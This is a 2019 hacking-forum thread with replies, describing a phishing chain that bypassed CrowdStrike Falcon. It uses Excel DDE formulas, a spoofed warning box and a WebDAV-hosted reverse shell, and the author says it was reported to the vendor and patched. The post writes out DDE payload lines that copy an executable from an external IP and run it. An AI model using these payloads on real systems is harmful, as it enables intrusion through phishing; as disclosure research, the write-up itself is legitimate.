<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Update 2019/01/14: Crowdstrike asked me to share an official statement: 
‚ÄúWe appreciate you reporting this detection miss to us and allowing us to rapidly address this gap on January 11th. We do have a bug bounty program&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="../10802.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell&#39;" href="../10802.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/b/bb3734339210d8d56a57877905851e9c99a117a5.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/b/bb3734339210d8d56a57877905851e9c99a117a5.png" />
<meta property="og:url" content="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802" />
<meta name="twitter:url" content="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802" />
<meta property="og:title" content="Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell" />
<meta name="twitter:title" content="Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell" />
<meta property="og:description" content="Update 2019/01/14: Crowdstrike asked me to share an official statement:  ‚ÄúWe appreciate you reporting this detection miss to us and allowing us to rapidly address this gap on January 11th. We do have a bug bounty program www.hackerone.com/crowdstrike or via bugs@crowdstrike.com that can be used by researchers to report any issues directly to us and get a monetary reward. We also would like to point out that while CrowdStrike Falcon did not originally show a UI detection for the establishment of ..." />
<meta name="twitter:description" content="Update 2019/01/14: Crowdstrike asked me to share an official statement:  ‚ÄúWe appreciate you reporting this detection miss to us and allowing us to rapidly address this gap on January 11th. We do have a bug bounty program www.hackerone.com/crowdstrike or via bugs@crowdstrike.com that can be used by researchers to report any issues directly to us and get a monetary reward. We also would like to point out that while CrowdStrike Falcon did not originally show a UI detection for the establishment of ..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="pentesting" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="5 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="49 ‚ù§" />
<meta property="article:published_time" content="2019-01-11T21:20:32+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="next" href="../10802%3Fpage=2.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="../10802.html">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../../tag/pentesting.html" class="discourse-tag" rel="tag">pentesting</a>,
<a href="../../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="pentesting, hacking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/b/bb3734339210d8d56a57877905851e9c99a117a5.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-11T21:20:32Z" class="post-time">
January 11, 2019, 9:20pm
</time>
<meta itemprop="dateModified" content="2019-01-25T20:36:34Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p><strong>Update 2019/01/14</strong>: Crowdstrike asked me to share an official statement:<br>
<em>‚ÄúWe appreciate you reporting this detection miss to us and allowing us to rapidly address this gap on January 11th. We do have a bug bounty program <a href="https://www.hackerone.com/crowdstrike" rel="noopener nofollow ugc">www.hackerone.com/crowdstrike</a> or via <a href="../../../cdn-cgi/l/email-protection.html#33514654407350415c44574047415a58561d505c5e"><span class="__cf_email__" data-cfemail="41233426320122332e3625323533282a246f222e2c">[email&#160;protected]</span></a> that can be used by researchers to report any issues directly to us and get a monetary reward. We also would like to point out that while CrowdStrike Falcon did not originally show a UI detection for the establishment of the shell (it did record all the activity with the EDR part of the solution), we believe that follow-on adversary activity would have been easily picked up by the product. We love engaging with the researcher community to continue making Falcon the best endpoint security solution on the market - thank you for the feedback!‚Äù</em></p>
<p><strong>Update 2019/01/22</strong>: I have confirmation that the two main competitors did not catch it either.</p>
<p>Crowdstrike Falcon is part of a new wave of endpoint security solutions that attempt to detect and block unusual activity using machine-learning and behavioral analysis (at least, that‚Äôs what the vendors say).</p>
<p>I can confirm that well known and used living off the land tactics (think Powershell, WScript, Bitsadmin, mshta, etc.) generally won‚Äôt be successful if Falcon is installed on the target. It will make a threat actor‚Äôs life a lot harder. It‚Äôs probably the same with other similar solutions such as Carbon Black, Cylance, etc.</p>
<p>When I say bypassing, I mean completely bypass detection, from the phishing email received by the user to the reverse shell. Something realistic, not just writing a malware and see if it gets executed.</p>
<p>So if we can‚Äôt use the classic techniques, about trying some new (old) trick?</p>
<p>Turns out, it was pretty trivial ¬Ø\_(„ÉÑ)_/¬Ø.</p>
<h2>The setup</h2>
<p>Attacker:</p>
<ul>
<li>A cheap VPS (found on LowEndBox) with Apache 2 and mod_webdav enabled and configured</li>
<li>A Python reverse shell packaged as single binary with <code>pyinstaller --onefile</code>
</li>
<li>Crafted Excel file</li>
</ul>
<p>Target VM:</p>
<ul>
<li>Windows 10 1803 with all the security fixes, up to date</li>
<li>Crowdstrike Falcon Sensor (latest version)</li>
<li>Excel 2016 fully patched, Outlook configured with my corporate mailbox</li>
</ul>
<h2>Step 1. The attachment</h2>
This time I decided to go with something less-known and a bit more tricky than a simple macro. I wanted to be sure it wouldn't be caught by the company's email filter and Windows Defender. I knew there was a chance that it would be caught by Falcon but I decided to try anyway.
<p>So I decided to use a trick I had observed during the Hancitor campaign a while ago, which is leveraging the Dynamic Data Exchange (DDE) feature instead of a macro.</p>
<p>My first attempt was to use it by inserting a formula in a Word document (CTRL+F9) in which I‚Äôd simply have to insert the following line:</p>
<p><code>{DDEAUTO c:\\windows\\system32\\cmd.exe "/k notepad.exe"}</code></p>
<p>Unfortunately, Notepad didn‚Äôt launch. After a quick search, I saw that Microsoft had <a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/" rel="noopener nofollow ugc">shipped a patch</a> in December 2017 that disabled the feature in Word.</p>
<p>So if it‚Äôs disabled in Word‚Ä¶ what about Excel?</p>
<p>Second try, inserting a formula in Excel:</p>
<p><code>=cmd|'/c notepad.exe'!_xlbgnm.A1</code></p>
<p>It worked!</p>
<p>To make things more credible to the user, it‚Äôs possible to manipulate the message displayed in the warning box for the user.</p>
<p>Originally, the message displayed is the following:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bb3734339210d8d56a57877905851e9c99a117a5.png" alt="image" data-base62-sha1="qIbyLKFn8aze52AIZVLAoQc1ucd" width="613" height="62"></p>
<p>However, it‚Äôs possible to replace the CMD.EXE with EXCEL.EXE to make things more credible using:<br>
<code> =EXCEL|'\..\..\..\Windows\System32\cmd.exe /c notepad.exe'!_xlbgnm.A1</code></p>
<p>Now, that‚Äôs seem a bit more legit:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bcfc02745f82dd67c3a43bdaf796c6eb22543511.png" alt="image" data-base62-sha1="qXPGVXr1zwv6uF7VTUlymxaZN97" width="614" height="62"></p>
<p>So I had a way to execute code through an attachment, assuming the user would click Yes to the warning message without reading. Now, about using this to download and execute the payload?</p>
<h2>Step 2. WebDAV</h2>
Why WebDAV? Assuming all the popular, living off the land tactics, wouldn't work and I would get caught, I started to think about a different way of doing things. Then, I remembered that Windows can connect and browse WebDAV servers using Explorer. Can you see what I'm getting at?
<p>I set up a small VPS with Apache and the mod_webdav module. Then, I changed ports.conf to free port 443, which I used to listen on with Netcat.</p>
<h2>Step 3. Executing a reverse shell</h2>
Making a reverse shell was easy. All I had to do is use some Python reverse shell code that works on Windows. There are plenty laying around on GitHub or pentesting blogs. Why Python? It was less likely to be detected. Then, on a Windows machine, I created a standalone executable using PyInstaller with the `pyinstaller --onefile run.py` command.
<p>Once the shell was ready, I uploaded it to the root of the WebDAV folder.</p>
<p>Now I had to see if it could be executed through WebDAV. On the victim VM:</p>
<p><code>=cmd|'/c cmd.exe /c "\\167.160.187.142\\webdav\run.exe"'!_xlbgnm.A1</code></p>
<p>Not working. Why? I run the command in the command prompt and I see:</p>
<pre><code class="lang-auto">The specified path does not exist.
Check the path, and then try again.
</code></pre>
<p>Yet the payload was there. So after a bit of Google search I found <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ee844140(v=ws.10)" rel="noopener nofollow ugc">this article</a> on TechNet and figured all I had to do was rename the file to <code>run.txt</code>, copy the file on the machine (it‚Äôs a network location after all!) and execute it locally. It worked.</p>
<p><code>=cmd|'/c cmd.exe /c "copy \\167.160.187.142\webdav\run.txt c:\users\public\run.exe" &amp;&amp; cmd.exe /c "c:\users\public\run.exe"'!_xlbgnm.A1</code></p>
<h2>Step 4. Putting the pieces together</h2>
Crowdstrike Falcon uses behavioral analysis to detect malicious Office documents that try to execute code. For example, if the process execution tree is the following:
<p>explorer.exe &gt; outlook.exe &gt; excel.exe &gt; powershell.exe -windowstyle hidden -executionpolicy bypass -enc</p>
<p>Is it because of the execution flow or simply because of the Powershell arguments? That‚Äôs unclear.</p>
<p>That said, the following worked:</p>
<ul>
<li>Created an email from a junk mailbox and attached the ‚Äúmalicious‚Äù Excel file to it.</li>
<li>Sent the email to a corporate mailbox</li>
<li>Open the email from the corporate mailbox in Outlook, open the attachment, click ‚ÄúYes‚Äù on the warning popup.</li>
<li>Wait</li>
<li>Get a shell on the machine.</li>
</ul>
<p>Wait! What? It worked? Something must be wrong. I then make sure the Falcon service is running. It is. I go check the host in the Falcon dashboard see if it still is communicating, it is. So I try again. Yup, still works.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a8893abe41da5ed30391c01ff9fea2666cfd559b.gif" alt width height></p>
<p>What Falcon saw and the reverse shell:</p>
<h5>(sorry for the potato screenshots, had to stich them together as new users can only post 1 image)</h5>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6bd8344f1586c1c0b508559488cf3f158f8ca597.png" alt="image" data-base62-sha1="fo2iUlR6SPS8VpQxkxhH0JVc5Lh" width="690" height="291"></p>
<p>While not a vulnerability, I decided to wait before writing this post and reported the bypass technique to Crowdstrike on December 21st 2018 so it‚Äôs not being abused by any bad actors (although they might have found it on their own). Crowdstrike confirmed that the bypass was valid and patched it on January 11th 2019.</p>
<p>If any of you can test with Carbon Black and other similar products, please let me know the results!</p>
<p>Edit 2019/01/14:</p>
<ul>
<li>Added an explanation on how to manipulate the warning message box to replace CMD.EXE with EXCEL.EXE</li>
<li>Added Crowdstrike official statement</li>
</ul>
<p>Edit 2019/01/22:</p>
<ul>
<li>I got confirmation the two main competitors did not caught it either.</li>
</ul>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="23" />
<span class="post-likes">23 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../0x00sec-2019-year-end-review-year-0x04/18391.html">0x00sec 2019 Year End Review - Year 0x04</a>
<meta itemprop="position" content="4">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Baud"><span itemprop="name">Baud</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-12T02:14:38Z" class="post-time">
January 12, 2019, 2:14am
</time>
<meta itemprop="dateModified" content="2019-01-12T02:14:38Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Great job reporting this issue, now it would be curious to test their patch to see if it just relies on simple signatures or if it‚Äôs actually behavior-based.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-12T15:28:14Z" class="post-time">
January 12, 2019, 3:28pm
</time>
<meta itemprop="dateModified" content="2019-01-12T15:28:14Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This is a fantastic article, this kind of content is absolutely awesome!</p>
<p>I am surprised that this bypasses falcon, especially unsigned exes. I‚Äôd love to give this method a shot with a cobalt strike beacon, I wonder how we‚Äôd do it?</p>
<p>I also wonder if this method would work with HTA‚Äôs or XSLs.</p>
<p>I‚Äôve actually been working on a code execution/LOLBin for windows that doesn‚Äôt use the norms. Was going to incorporate <a href="https://github.com/itm4n/VBA-RunPE">https://github.com/itm4n/VBA-RunPE</a> somewhere (this allows you to embed PE files in VBA), this might be helpful to streamline this process. What do you think?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-13T02:21:24Z" class="post-time">
January 13, 2019, 2:21am
</time>
<meta itemprop="dateModified" content="2019-01-13T02:21:24Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hey thanks! I don‚Äôt have much experience at writing this kind of article in general so I appreciate any feedback. Please try with whatever product you can. I‚Äôd be curious to know the results and I think it‚Äôs really important to properly test these products (meaning not using the usual techniques) considering how much they cost and all the buzzwords they use to sell them. In Crowdstrike‚Äôs case, I was pleasantly surprised with they‚Äôre quick answer and collaboration on the subject.</p>
<p>Regarding HTAs and XSLs, I previously read one of your articles on the subject a while ago and I did some tests where Falcon had caught them all. I never tried to do a macro with RunPE (first time I hear of this project, looks really cool!) but I definitely will. That said, I don‚Äôt focus on the macros because they‚Äôre easily detected by email filters and a company with good security practice will disable the execution via GPOs but I don‚Äôt doubt lots of people are still using them.</p>
<p>I‚Äôll keep you posted by PM when I try in a few days.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-13T02:22:10Z" class="post-time">
January 13, 2019, 2:22am
</time>
<meta itemprop="dateModified" content="2019-01-13T02:22:10Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you! I will definitely test again in the coming days <img src="../../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Alfred_Kayuan"><span itemprop="name">Alfred_Kayuan</span></a>
(Alfred Kayuan)
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/9/9349e9b5fc470bfac5e33dfa3cedbf19ee9a3937.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T05:29:07Z" class="post-time">
January 14, 2019, 5:29am
</time>
<meta itemprop="dateModified" content="2019-01-14T05:29:07Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>still don‚Äôt get how you get to run DDE in excel 2016? been testing this for awhile and no luck. Excel 2016 windows10 16299</p>
<p>this is what i keep getting</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9349e9b5fc470bfac5e33dfa3cedbf19ee9a3937.png" alt="excel" data-base62-sha1="l0YxQnEGoXLYbAwbyHXkyRJw367" width="690" height="338"></p>
<p>a good advice is needed</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T10:17:09Z" class="post-time">
January 14, 2019, 10:17am
</time>
<meta itemprop="dateModified" content="2019-01-15T02:45:56Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>If you want more articles like these, please consider funding us these products (anti-virus, anti-malware, anti-xyz, Microsoft Office, (mail) servers, licensed Cobalt Strike, etc.) <img src="../../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Bank_Security"><span itemprop="name">Bank_Security</span></a>
(*)
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/d/dba6c5bca5844abc412903ca5ab3e1450fea2171.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T11:40:13Z" class="post-time">
January 14, 2019, 11:40am
</time>
<meta itemprop="dateModified" content="2019-01-14T11:40:13Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Nice article!! Excellent as a starting point for a red team. If you may be interested, I would like to share my research similar to this one.</p>
<p>Undetectable C# &amp; C++ Reverse Shells:<br>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c7390150cd0078e967a18c7663581b9b334d239.png" class="site-icon" width height>
<a href="https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15" target="_blank" rel="noopener nofollow ugc" title="02:20PM - 06 August 2020">Medium ‚Äì 6 Aug 20</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dba6c5bca5844abc412903ca5ab3e1450fea2171.png" class="thumbnail" width height>
<h3><a href="https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15" target="_blank" rel="noopener nofollow ugc">Undetectable C# &amp; C++ Reverse Shells</a></h3>
<p>Technical overview of different way to spawn a reverse shell on a victim machine</p>
<p><span class="label1">Reading time: 7 min read</span>
</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T13:47:35Z" class="post-time">
January 14, 2019, 1:47pm
</time>
<meta itemprop="dateModified" content="2019-01-14T13:47:35Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Interesting!</p>
<p>Did you test in a fresh install or on a pre-configured machine? Depending on the organization and GPOs that are pushed for Office, the execution of external DDE servers might be disabled by default. In the organization where I tested, macros are disabled by default but external DDE servers are enabled and the settings can‚Äôt be controlled by the user. It‚Äôs a feature often used in financial institutions. You can go enable it in the Options &gt; Trust Center &gt; External content.</p>
<p>I‚Äôm not sure what the defaults are on a fresh Office install on a non domain-connect machine. I‚Äôm building a VM with a fresh Office 2016 without connecting it to the domain so we‚Äôll see.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
